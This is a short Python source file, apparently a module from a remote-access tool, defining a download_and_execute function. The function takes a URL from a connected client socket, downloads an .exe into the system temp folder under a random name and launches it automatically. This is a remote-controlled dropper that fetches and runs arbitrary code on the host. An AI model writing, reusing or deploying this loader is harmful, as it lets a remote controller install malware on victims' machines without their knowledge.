from requests import get
from tempfile import gettempdir
from random import choices
from string import ascii_lowercase, digits
from os import startfile


def download_and_execute(client=None, auto_start=True, url=None):
    """
    Downloads exe files from the web into the temp folder and starts them
    :param client: client socket object to receive the url
    :param auto_start: auto start the downloaded exe file
    :param url: URL link of the exe file
    :return: path of exe file, return None if there was an error
    """
    if client is not None:
        url = client.receive()  # Receives URL link of the exe file

    # Check if it's a valid exe link
    if url[-4:] == '.exe':
        try:
            file = get(url).content  # Gets files data

            # Save file to temp folder under a random name.
            path = gettempdir() + '\\' + ''.join(choices(ascii_lowercase + digits, k=6)) + '.exe'
            with open(path, 'wb') as f:
                f.write(file)

            if auto_start:
                startfile(path)  # Starts file
            return path

        except Exception:
            return None
